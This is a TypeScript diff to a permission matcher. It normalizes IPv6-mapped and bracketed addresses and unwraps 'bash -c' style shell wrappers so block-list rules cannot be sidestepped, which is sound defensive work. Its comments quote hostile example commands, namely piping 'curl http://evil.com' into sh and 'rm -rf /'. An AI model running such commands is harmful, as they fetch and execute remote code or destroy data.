@@ -10,6 +10,7 @@
  */
 
 import type { SkillCapability } from '../types.js'
+import { SHELL_WRAPPER_PREFIXES } from '../types.js'
 
 // ---------------------------------------------------------------------------
 // Public API
@@ -132,19 +133,42 @@ function isRegexSpecial(char: string): boolean {
  * - CIDR notation (e.g., "10.0.0.0/8" matches "10.1.2.3")
  * - Exact IP match (e.g., "169.254.169.254" matches "169.254.169.254")
  * - Exact hostname match (e.g., "localhost" matches "localhost")
+ * - IPv6-mapped IPv4 normalization (e.g., "::ffff:127.0.0.1" → "127.0.0.1")
  *
  * @param requested - The target being accessed (IP or hostname)
  * @param ruleScope - The CIDR range, IP, or hostname pattern
  * @returns true if the requested target falls within the rule scope
  */
 function matchNetwork(requested: string, ruleScope: string): boolean {
-  // CIDR notation (IPv4 only for now)
+  // Normalize: strip bracket wrappers (e.g. "[::1]" → "::1")
+  const normalizedRequested = normalizeNetworkTarget(requested)
+
+  // CIDR notation
   if (ruleScope.includes('/')) {
-    return matchCidr(requested, ruleScope)
+    return matchCidr(normalizedRequested, ruleScope)
   }
 
   // Exact match for hostnames and IPs
-  return requested === ruleScope
+  const normalizedRule = normalizeNetworkTarget(ruleScope)
+  return normalizedRequested === normalizedRule
+}
+
+/**
+ * Normalize a network target for consistent matching:
+ * - Strip bracket wrappers: "[::1]" → "::1"
+ * - Convert IPv6-mapped IPv4 to plain IPv4: "::ffff:10.0.0.1" → "10.0.0.1"
+ */
+function normalizeNetworkTarget(target: string): string {
+  // Strip brackets
+  let normalized = target.replace(/^\[|\]$/g, '')
+
+  // IPv6-mapped IPv4: ::ffff:A.B.C.D → A.B.C.D
+  const mappedMatch = normalized.match(/^::ffff:(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})$/i)
+  if (mappedMatch) {
+    normalized = mappedMatch[1]
+  }
+
+  return normalized
 }
 
 /**
@@ -223,16 +247,35 @@ function ipToUint32(ip: string): number | null {
  * This is intentionally simpler than glob matching — no path separators,
  * no `**`, no `?`.
  *
+ * Also detects shell wrappers (e.g., `bash -c "rm -rf /"`) and checks
+ * the inner command against the pattern.
+ *
  * Examples:
  * - "npm *" matches "npm install", "npm test", "npm run build"
  * - "sudo" matches "sudo" (exact)
  * - "curl * | sh" matches "curl http://evil.com | sh"
+ * - "bash -c 'sudo rm -rf /'" matches "sudo" (via shell-wrapper unwrapping)
  *
  * @param command - The command being executed
  * @param pattern - The pattern from the blocked/allowed list
  * @returns true if the command matches the pattern
  */
 function matchPattern(command: string, pattern: string): boolean {
+  if (matchPatternDirect(command, pattern)) {
+    return true
+  }
+
+  // Unwrap shell wrappers and check the inner command
+  const inner = unwrapShellWrapper(command)
+  if (inner && inner !== command) {
+    return matchPatternDirect(inner, pattern)
+  }
+
+  return false
+}
+
+/** Direct pattern match without shell-wrapper unwrapping. */
+function matchPatternDirect(command: string, pattern: string): boolean {
   // Exact match shortcut
   if (pattern === command) {
     return true
@@ -249,6 +292,27 @@ function matchPattern(command: string, pattern: string): boolean {
   const regexStr = pattern.split('*').map(escapeRegex).join('.*')
 
   return new RegExp('^' + regexStr + '$').test(command)
+}
+
+/**
+ * Unwrap a shell wrapper command to extract the inner command string.
+ * E.g., `bash -c "rm -rf /"` → `rm -rf /`
+ */
+function unwrapShellWrapper(command: string): string | null {
+  for (const prefix of SHELL_WRAPPER_PREFIXES) {
+    if (command.startsWith(prefix + ' ')) {
+      let inner = command.slice(prefix.length + 1).trim()
+      // Strip surrounding quotes
+      if (
+        (inner.startsWith('"') && inner.endsWith('"')) ||
+        (inner.startsWith("'") && inner.endsWith("'"))
+      ) {
+        inner = inner.slice(1, -1)
+      }
+      return inner.trim()
+    }
+  }
+  return null
 }
 
 /**
